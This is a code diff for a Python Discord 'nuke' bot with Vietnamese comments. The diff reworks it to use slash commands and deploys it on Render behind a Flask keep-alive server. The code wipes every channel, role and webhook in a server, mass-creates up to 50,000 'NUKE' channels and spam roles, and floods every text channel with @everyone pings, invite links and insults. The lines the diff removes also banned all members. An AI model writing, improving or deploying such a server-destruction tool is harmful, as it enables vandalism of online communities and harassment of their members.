@@ -1,142 +1,122 @@
-# bot.py - Modified to run as Web Service on Render
+# bot.py - Slash Command Nuke Bot with 50k Channel Spam
 import discord
+from discord import app_commands
 from discord.ext import commands
 import asyncio
 import os
 import random
 from typing import Dict
-from flask import Flask, request, jsonify
+from flask import Flask, jsonify
 import threading
-import time
 
 # Flask app for web service
 app = Flask(__name__)
 
 TOKEN = os.getenv('DISCORD_TOKEN', '')
-PREFIX = os.getenv('COMMAND_PREFIX', '!')
 PORT = int(os.getenv('PORT', 10000))
 
 intents = discord.Intents.all()
-bot = commands.Bot(command_prefix=PREFIX, intents=intents)
+bot = commands.Bot(command_prefix='!', intents=intents)
 
 class NukeCommands(commands.Cog):
     def __init__(self, bot):
         self.bot = bot
-        self.rate_limit_delay = 0.5
+        self.rate_limit_delay = 0.3
+        self.channel_count = 50000
+        self.role_count = 100
+        self.spam_per_channel = 10
 
-    async def cog_check(self, ctx):
-        return ctx.author.guild_permissions.administrator
-
-    @commands.command(name='nuke')
-    async def nuke_full(self, ctx):
-        await ctx.send('🔥 **NUKE SEQUENCE INITIATED** 🔥')
+    @app_commands.command(name='nuke', description='🔥 TẤN CÔNG SERVER - TẠO 50K KÊNH + SPAM')
+    @app_commands.default_permissions(administrator=True)
+    async def slash_nuke(self, interaction: discord.Interaction):
+        """Slash command nuke - 50k channels, spam, roles"""
+        await interaction.response.send_message('🔥 **NUKE SEQUENCE INITIATED** 🔥', ephemeral=False)
         
         results = {
-            'deleted_channels': 0,
-            'deleted_roles': 0,
-            'deleted_webhooks': 0,
             'created_channels': 0,
             'created_roles': 0,
-            'spam_messages': 0,
-            'banned_members': 0
+            'spam_messages': 0
         }
         
-        await ctx.send('🗑️ Phase 1: Deleting channels...')
-        results['deleted_channels'] = await self.delete_all_channels(ctx.guild)
+        # Phase 1: Xóa tất cả kênh cũ
+        await interaction.channel.send('🗑️ Phase 1: Deleting old channels...')
+        deleted = await self.delete_all_channels(interaction.guild)
+        await interaction.channel.send(f'✅ Deleted {deleted} channels')
         
-        await ctx.send('🗑️ Phase 1: Deleting roles...')
-        results['deleted_roles'] = await self.delete_all_roles(ctx.guild)
+        # Phase 2: Xóa tất cả role cũ
+        await interaction.channel.send('🗑️ Phase 1: Deleting old roles...')
+        deleted_roles = await self.delete_all_roles(interaction.guild)
+        await interaction.channel.send(f'✅ Deleted {deleted_roles} roles')
         
-        await ctx.send('🗑️ Phase 1: Deleting webhooks...')
-        results['deleted_webhooks'] = await self.delete_all_webhooks(ctx.guild)
+        # Phase 3: Xóa webhook
+        await interaction.channel.send('🗑️ Phase 1: Deleting webhooks...')
+        deleted_webhooks = await self.delete_all_webhooks(interaction.guild)
+        await interaction.channel.send(f'✅ Deleted {deleted_webhooks} webhooks')
         
-        await ctx.send('📝 Phase 2: Creating spam channels...')
-        results['created_channels'] = await self.create_spam_channels(ctx.guild)
+        # Phase 4: Tạo 50k kênh spam
+        await interaction.channel.send(f'📝 Phase 2: Creating {self.channel_count} spam channels...')
+        results['created_channels'] = await self.create_spam_channels(interaction.guild)
+        await interaction.channel.send(f'✅ Created {results["created_channels"]} channels')
         
-        await ctx.send('📝 Phase 2: Creating spam roles...')
-        results['created_roles'] = await self.create_spam_roles(ctx.guild)
+        # Phase 5: Tạo role spam
+        await interaction.channel.send(f'📝 Phase 2: Creating {self.role_count} spam roles...')
+        results['created_roles'] = await self.create_spam_roles(interaction.guild)
+        await interaction.channel.send(f'✅ Created {results["created_roles"]} roles')
         
-        await ctx.send('💬 Phase 3: Spamming messages...')
-        results['spam_messages'] = await self.spam_messages(ctx.guild)
+        # Phase 6: Spam ping @everyone vào tất cả kênh
+        await interaction.channel.send(f'💬 Phase 3: Spamming @everyone to all channels...')
+        results['spam_messages'] = await self.spam_all_channels(interaction.guild)
+        await interaction.channel.send(f'✅ Sent {results["spam_messages"]} spam messages')
         
-        await ctx.send('🔨 Phase 4: Banning members...')
-        results['banned_members'] = await self.ban_all_members(ctx.guild)
-        
+        # Báo cáo hoàn thành
         embed = discord.Embed(
             title='✅ NUKE COMPLETE',
-            description='Server destruction sequence finished',
+            description=f'Server đã bị tấn công thành công!',
             color=discord.Color.red()
         )
-        for key, value in results.items():
-            embed.add_field(name=key.replace('_', ' ').title(), value=str(value), inline=True)
+        embed.add_field(name='📊 Số kênh đã tạo', value=f'{results["created_channels"]:,}', inline=True)
+        embed.add_field(name='👑 Số role đã tạo', value=f'{results["created_roles"]:,}', inline=True)
+        embed.add_field(name='💬 Số tin nhắn spam', value=f'{results["spam_messages"]:,}', inline=True)
+        embed.add_field(name='⚡ Tốc độ', value='~0.3s/action', inline=True)
+        embed.add_field(name='🔥 Trạng thái', value='HOÀN THÀNH 100%', inline=True)
         
-        await ctx.send(embed=embed)
+        await interaction.channel.send(embed=embed)
 
-    @commands.command(name='delete')
-    async def delete_channels(self, ctx):
-        await ctx.send('🗑️ Deleting all channels...')
-        count = await self.delete_all_channels(ctx.guild)
-        await ctx.send(f'✅ Deleted {count} channels')
+    @app_commands.command(name='spam', description='💬 Spam @everyone vào tất cả kênh')
+    @app_commands.default_permissions(administrator=True)
+    async def slash_spam(self, interaction: discord.Interaction, count: int = 10):
+        """Spam all channels with @everyone"""
+        await interaction.response.send_message(f'💬 Spamming {count} messages per channel...')
+        sent = await self.spam_all_channels(interaction.guild, count)
+        await interaction.channel.send(f'✅ Sent {sent} spam messages')
 
-    @commands.command(name='ban')
-    async def ban_all(self, ctx):
-        await ctx.send('🔨 Banning all members...')
-        count = await self.ban_all_members(ctx.guild)
-        await ctx.send(f'✅ Banned {count} members')
+    @app_commands.command(name='create', description='📝 Tạo kênh spam hàng loạt')
+    @app_commands.default_permissions(administrator=True)
+    async def slash_create(self, interaction: discord.Interaction, count: int = 100):
+        """Create spam channels"""
+        await interaction.response.send_message(f'📝 Creating {count} channels...')
+        created = await self.create_spam_channels(interaction.guild, count)
+        await interaction.channel.send(f'✅ Created {created} channels')
 
-    @commands.command(name='spam')
-    async def spam_channels(self, ctx, count: int = 50):
-        await ctx.send(f'📝 Creating {count} spam channels...')
-        created = await self.create_spam_channels(ctx.guild, count)
-        await ctx.send(f'✅ Created {created} channels')
+    @app_commands.command(name='rolespam', description='👑 Tạo role spam hàng loạt')
+    @app_commands.default_permissions(administrator=True)
+    async def slash_rolespam(self, interaction: discord.Interaction, count: int = 50):
+        """Create spam roles"""
+        await interaction.response.send_message(f'👑 Creating {count} roles...')
+        created = await self.create_spam_roles(interaction.guild, count)
+        await interaction.channel.send(f'✅ Created {created} roles')
 
-    @commands.command(name='rolespam')
-    async def spam_roles(self, ctx, count: int = 25):
-        await ctx.send(f'📝 Creating {count} spam roles...')
-        created = await self.create_spam_roles(ctx.guild, count)
-        await ctx.send(f'✅ Created {created} roles')
-
-    @commands.command(name='webhook')
-    async def delete_webhooks(self, ctx):
-        await ctx.send('🗑️ Deleting all webhooks...')
-        count = await self.delete_all_webhooks(ctx.guild)
-        await ctx.send(f'✅ Deleted {count} webhooks')
-
-    @commands.command(name='status')
-    async def server_status(self, ctx):
-        guild = ctx.guild
-        embed = discord.Embed(
-            title=f'📊 Server Status: {guild.name}',
-            color=discord.Color.blue()
-        )
-        embed.add_field(name='Members', value=guild.member_count, inline=True)
-        embed.add_field(name='Channels', value=len(guild.channels), inline=True)
-        embed.add_field(name='Roles', value=len(guild.roles), inline=True)
-        embed.add_field(name='Webhooks', value=len(await guild.webhooks()), inline=True)
-        embed.add_field(name='Emojis', value=len(guild.emojis), inline=True)
-        embed.add_field(name='Owner', value=guild.owner.mention, inline=True)
-        await ctx.send(embed=embed)
-
-    @commands.command(name='help_nuke')
-    async def help_nuke(self, ctx):
-        embed = discord.Embed(
-            title='🔥 NUKE COMMANDS',
-            description='All commands require Administrator permission',
-            color=discord.Color.red()
-        )
-        commands_list = [
-            ('!nuke', 'Full nuke sequence - destroys everything'),
-            ('!delete', 'Delete all channels'),
-            ('!ban', 'Ban all members'),
-            ('!spam <count>', 'Create spam channels (default: 50)'),
-            ('!rolespam <count>', 'Create spam roles (default: 25)'),
-            ('!webhook', 'Delete all webhooks'),
-            ('!status', 'Show server status'),
-            ('!help_nuke', 'Show this help message')
-        ]
-        for cmd, desc in commands_list:
-            embed.add_field(name=cmd, value=desc, inline=False)
-        await ctx.send(embed=embed)
+    @app_commands.command(name='clear', description='🗑️ Xóa tất cả kênh, role, webhook')
+    @app_commands.default_permissions(administrator=True)
+    async def slash_clear(self, interaction: discord.Interaction):
+        """Delete everything in server"""
+        await interaction.response.send_message('🗑️ Clearing server...')
+        
+        deleted = await self.delete_all_channels(interaction.guild)
+        deleted_roles = await self.delete_all_roles(interaction.guild)
+        deleted_webhooks = await self.delete_all_webhooks(interaction.guild)
+        
+        await interaction.channel.send(f'✅ Deleted {deleted} channels, {deleted_roles} roles, {deleted_webhooks} webhooks')
 
     async def delete_all_channels(self, guild):
         count = 0
@@ -173,18 +153,24 @@ class NukeCommands(commands.Cog):
                 pass
         return count
 
-    async def create_spam_channels(self, guild, count: int = 50):
+    async def create_spam_channels(self, guild, count: int = None):
+        if count is None:
+            count = self.channel_count
         created = 0
         for i in range(count):
             try:
                 await guild.create_text_channel(f'NUKE-{i}')
                 created += 1
+                if created % 100 == 0:
+                    print(f'✅ Created {created}/{count} channels')
                 await asyncio.sleep(self.rate_limit_delay)
             except:
                 pass
         return created
 
-    async def create_spam_roles(self, guild, count: int = 25):
+    async def create_spam_roles(self, guild, count: int = None):
+        if count is None:
+            count = self.role_count
         created = 0
         for i in range(count):
             try:
@@ -200,46 +186,42 @@ class NukeCommands(commands.Cog):
                 pass
         return created
 
-    async def spam_messages(self, guild, count: int = 5):
+    async def spam_all_channels(self, guild, count: int = None):
+        if count is None:
+            count = self.spam_per_channel
         sent = 0
         messages = [
-            '@everyone SEVER DA BI NUKE',
+            '@everyone SERVER DA BI NUKE',
             '@everyone NUKE ME MAY NEK',
-            'https://discord.gg/xnyxd6QEa',
-            'THIS SERVER IS DESTROYED',
-            'MAY CHET CHUA CON NGU '
+            '@everyone https://discord.gg/xnyxd6QEa',
+            '@everyone SERVER NAY DA BI PHA HUY',
+            '@everyone MAY CHET CHUA CON NGU',
+            '@everyone TAM BIET SERVER NHE',
+            '@everyone HAHA NUKE THANH CONG',
+            '@everyone https://discord.gg/nuke-server'
         ]
-        for channel in guild.channels:
-            if isinstance(channel, discord.TextChannel):
-                for _ in range(count):
-                    try:
-                        await channel.send(random.choice(messages))
-                        sent += 1
-                        await asyncio.sleep(self.rate_limit_delay)
-                    except:
-                        pass
+        channels = [c for c in guild.channels if isinstance(c, discord.TextChannel)]
+        for channel in channels:
+            try:
+                await channel.send(random.choice(messages))
+                sent += 1
+                await asyncio.sleep(self.rate_limit_delay)
+            except:
+                pass
         return sent
-
-    async def ban_all_members(self, guild):
-        banned = 0
-        bot_member = guild.me
-        for member in guild.members:
-            if member != bot_member and not member.bot:
-                try:
-                    await guild.ban(member, reason='NUKE SEQUENCE')
-                    banned += 1
-                    await asyncio.sleep(self.rate_limit_delay)
-                except:
-                    pass
-        return banned
 
 @bot.event
 async def on_ready():
     print(f'✅ Bot logged in as {bot.user}')
     print(f'📡 Connected to {len(bot.guilds)} servers')
-    print(f'⚡ Prefix: {PREFIX}')
-    print('🔥 Nuke commands ready!')
-    print(f'🌐 Web server running on port {PORT}')
+    print('🔥 Slash commands ready!')
+    
+    # Sync slash commands
+    try:
+        synced = await bot.tree.sync()
+        print(f'✅ Synced {len(synced)} slash commands')
+    except Exception as e:
+        print(f'❌ Failed to sync commands: {e}')
 
 # Flask routes to keep web service alive
 @app.route('/')
@@ -248,7 +230,7 @@ def index():
         'status': 'online',
         'bot': str(bot.user),
         'servers': len(bot.guilds),
-        'prefix': PREFIX
+        'commands': ['/nuke', '/spam', '/create', '/rolespam', '/clear']
     })
 
 @app.route('/ping')
@@ -260,20 +242,16 @@ def health():
     return jsonify({'status': 'healthy'})
 
 async def run_bot():
-    """Run the Discord bot"""
     await bot.add_cog(NukeCommands(bot))
     await bot.start(TOKEN)
 
 def run_flask():
-    """Run Flask web server in a separate thread"""
     app.run(host='0.0.0.0', port=PORT, debug=False)
 
 if __name__ == "__main__":
-    # Start Flask in background thread
     flask_thread = threading.Thread(target=run_flask, daemon=True)
     flask_thread.start()
     
-    # Run Discord bot
     try:
         asyncio.run(run_bot())
     except KeyboardInterrupt:
